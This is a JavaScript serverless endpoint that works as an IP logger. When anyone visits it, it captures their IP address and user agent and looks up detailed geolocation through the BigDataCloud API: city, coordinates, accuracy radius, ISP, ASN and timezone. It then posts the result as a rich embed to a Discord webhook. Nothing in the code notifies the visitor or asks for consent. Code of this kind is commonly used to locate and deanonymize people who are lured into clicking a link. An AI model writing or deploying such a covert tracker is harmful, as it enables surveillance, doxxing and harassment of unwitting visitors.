export default async function handler(req, res) {
  // Enable CORS
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

  // Handle preflight requests
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }

  try {
    // 1. Get Client Information
    let clientIP = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    if (clientIP.includes(',')) {
      clientIP = clientIP.split(',')[0].trim();
    }
    clientIP = clientIP.replace(/^::ffff:/, '');
    const userAgent = req.headers['user-agent'] || 'Unknown';

    // 2. Fetch Data from BigDataCloud (Using the FULL Endpoint)
    const apiKey = process.env.BIGDATACLOUD_API_KEY; // Use your registered free key
    let ipData = {};
    let timezoneData = {};

    try {
      // MAIN CALL: Get complete geolocation with accuracy/confidence
      const geoResponse = await fetch(
        `https://api.bigdatacloud.net/data/ip-geolocation-full?ip=${clientIP}&localityLanguage=en&key=${apiKey}`
      );

      if (geoResponse.ok) {
        ipData = await geoResponse.json();
        console.log('Full IP data fetched successfully');
      } else {
        const errorText = await geoResponse.text();
        console.error('BigDataCloud API Error:', geoResponse.status, errorText);
        throw new Error(`BigDataCloud API failed: ${geoResponse.status}`);
      }

      // Get timezone data if coordinates are available
      if (ipData.location?.latitude) {
        const tzResponse = await fetch(
          `https://api.bigdatacloud.net/data/timezone-by-location?latitude=${ipData.location.latitude}&longitude=${ipData.location.longitude}&localityLanguage=en&key=${apiKey}`
        );
        if (tzResponse.ok) {
          timezoneData = await tzResponse.json();
        }
      }

    } catch (apiError) {
      console.error('API Fetch Error:', apiError.message);
      // Re-throw to be caught by the main try-catch
      throw new Error(`Failed to fetch geolocation data: ${apiError.message}`);
    }

    // 3. Structure the Complete Data
    const structuredData = {
      ip: clientIP,
      userAgent: userAgent,
      timestamp: new Date().toISOString(),
      
      // Location Data (now includes accuracy and confidence)
      location: {
        city: ipData?.location?.city || 'Unknown',
        region: ipData?.location?.region || 'Unknown',
        country: ipData?.country?.name || 'Unknown',
        countryCode: ipData?.country?.isoAlpha2 || 'Unknown',
        latitude: ipData?.location?.latitude || 0,
        longitude: ipData?.location?.longitude || 0,
        postalCode: ipData?.location?.postalCode || 'Unknown',
        continent: ipData?.continent?.name || 'Unknown',
        // ✅ THESE ARE THE NEWLY ADDED FIELDS
        accuracyRadius: ipData?.location?.accuracyRadius || null, // in kilometers
        confidence: ipData?.location?.confidence || 'unknown' // 'high', 'medium', 'low'
      },
      
      // Network Data
      network: {
        isp: ipData?.network?.carrier?.name || 'Unknown',
        organization: ipData?.network?.organisation || 'Unknown',
        asn: ipData?.network?.autonomousSystemNumber || 'Unknown',
        connectionType: ipData?.network?.connectionType || 'Unknown',
      },
      
      // Timezone Data
      timezone: {
        name: timezoneData?.ianaTimeZone || 'Unknown',
        localTime: timezoneData?.localTime || new Date().toISOString(),
        gmtOffsetString: timezoneData?.gmtOffsetString || '+00:00',
      },
      
      // Device Info (parsed from User Agent)
      device: parseUserAgent(userAgent),
      
      // Additional Metadata
      metadata: {
        callingCode: ipData?.country?.callingCode || 'Unknown',
        currency: ipData?.country?.currency?.code || 'Unknown',
        isEU: ipData?.country?.isEU || false,
      }
    };

    // 4. Send Rich Embed to Discord
    if (process.env.DISCORD_WEBHOOK_URL) {
      try {
        await sendToDiscord(structuredData);
        console.log('Discord webhook sent successfully');
      } catch (discordError) {
        console.error('Failed to send Discord webhook:', discordError.message);
      }
    }

    // 5. Return JSON Response to Client
    res.status(200).json({
      success: true,
      message: "Complete IP data collected successfully",
      data: structuredData
    });

  } catch (error) {
    console.error('Server Error:', error);
    res.status(500).json({
      success: false,
      error: error.message,
      note: "Check your BigDataCloud API key and quota"
    });
  }
}

// Helper: Parse User Agent String
function parseUserAgent(userAgent) {
  const ua = userAgent || '';
  let browser = 'Unknown';
  let os = 'Unknown';
  let device = 'Desktop';

  if (ua.includes('Chrome')) browser = 'Chrome';
  else if (ua.includes('Firefox')) browser = 'Firefox';
  else if (ua.includes('Safari')) browser = 'Safari';
  else if (ua.includes('Edge')) browser = 'Edge';

  if (ua.includes('Windows')) os = 'Windows';
  else if (ua.includes('Mac')) os = 'Mac OS';
  else if (ua.includes('Linux')) os = 'Linux';
  else if (ua.includes('Android')) os = 'Android';
  else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';

  if (ua.includes('Mobile')) device = 'Mobile';
  else if (ua.includes('Tablet')) device = 'Tablet';

  return { browser, os, device, raw: ua.substring(0, 200) };
}

// Helper: Send Formatted Embed to Discord
async function sendToDiscord(data) {
  const webhookURL = process.env.DISCORD_WEBHOOK_URL;
  if (!webhookURL) return;

  const embed = {
    embeds: [{
      title: "🌐 Complete Visitor Data Logged",
      color: 0x3498db,
      timestamp: data.timestamp,
      fields: [
        {
          name: "📍 IP Address",
          value: `\`\`\`${data.ip}\`\`\``,
          inline: false
        },
        {
          name: "🌍 Location",
          value: `**City:** ${data.location.city}\n**Region:** ${data.location.region}\n**Country:** ${data.location.country} (${data.location.countryCode})`,
          inline: true
        },
        {
          name: "🎯 Accuracy & Confidence",
          value: `**Radius:** ${data.location.accuracyRadius ? data.location.accuracyRadius + ' km' : 'N/A'}\n**Confidence:** ${data.location.confidence.toUpperCase()}`,
          inline: true
        },
        {
          name: "📡 Network",
          value: `**ISP:** ${data.network.isp}\n**Organization:** ${data.network.organization}\n**ASN:** ${data.network.asn}`,
          inline: true
        },
        {
          name: "🕒 Timezone",
          value: `**Zone:** ${data.timezone.name}\n**Local Time:** ${new Date(data.timezone.localTime).toLocaleString()}\n**Offset:** ${data.timezone.gmtOffsetString}`,
          inline: true
        },
        {
          name: "🖥️ Device",
          value: `**Browser:** ${data.device.browser}\n**OS:** ${data.device.os}\n**Type:** ${data.device.device}`,
          inline: true
        },
        {
          name: "📊 Coordinates",
          value: `**Lat:** ${data.location.latitude}\n**Long:** ${data.location.longitude}`,
          inline: true
        },
        {
          name: "📄 User Agent",
          value: `\`\`\`${data.device.raw}\`\`\``,
          inline: false
        }
      ],
      footer: {
        text: `BigDataCloud IP Logger | ${data.location.continent}`
      }
    }]
  };

  const response = await fetch(webhookURL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embed)
  });

  if (!response.ok) {
    throw new Error(`Discord webhook failed: ${response.status}`);
  }
        }
